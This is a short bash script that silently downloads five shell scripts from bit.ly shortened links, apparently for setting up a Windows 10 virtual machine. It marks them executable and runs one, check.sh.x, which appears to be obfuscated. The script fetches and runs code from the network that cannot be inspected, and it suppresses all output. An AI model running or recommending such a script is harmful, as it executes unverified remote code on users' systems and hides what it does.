#!/bin/bash
clear
wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
wget -O win10vm.sh https://bit.ly/2ULIFS5 > /dev/null 2>&1
wget -O check.sh.x https://bit.ly/2VfGi9E > /dev/null 2>&1
wget -O region.sh https://bit.ly/2TFWhxr > /dev/null 2>&1
chmod +x win10vm.sh
chmod +x exit.sh
chmod +x sleep.sh
chmod +x region.sh
chmod +x check.sh.x
./check.sh.x
